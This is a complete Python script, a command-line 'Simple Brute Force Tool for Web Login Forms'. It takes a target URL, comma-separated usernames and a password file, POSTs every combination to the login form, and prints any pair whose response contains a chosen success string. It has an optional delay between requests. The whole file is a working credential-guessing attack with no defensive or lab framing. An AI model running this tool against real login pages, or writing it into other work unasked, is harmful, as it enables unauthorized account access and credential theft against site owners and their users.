import requests
import sys
import time
import argparse

def brute_force(target, usernames, passwords_file, needle, delay=0):
    for username in usernames:
        with open(passwords_file, "r", encoding="utf-8") as passwords_list:
            for password in passwords_list:
                password = password.strip()
                sys.stdout.write(f"[X] Brute Forcing: {username} : {password}\n")
                sys.stdout.flush()

                try:
                    response = requests.post(target, data={"username": username, "password": password}, timeout=5)
                    if needle in response.text:
                        sys.stdout.write(f"[>] Valid credentials found: {username} : {password}\n")
                        return
                except requests.exceptions.RequestException as e:
                    sys.stdout.write(f"[!] Error: {e}\n")
                    sys.stdout.flush()
                
                time.sleep(delay) 

        sys.stdout.write(f"[!] No valid password found for user: {username}\n")
        sys.stdout.flush()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple Brute Force Tool for Web Login Forms")
    parser.add_argument("target", help="Target URL of the login form")
    parser.add_argument("usernames", help="Comma-separated list of usernames to try")
    parser.add_argument("passwords_file", help="Path to the password file")
    parser.add_argument("needle", help="Text that identify successful login")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests (in seconds)")

    args = parser.parse_args()
    
    usernames = args.usernames.split(",")
    brute_force(args.target, usernames, args.passwords_file, args.needle, args.delay)
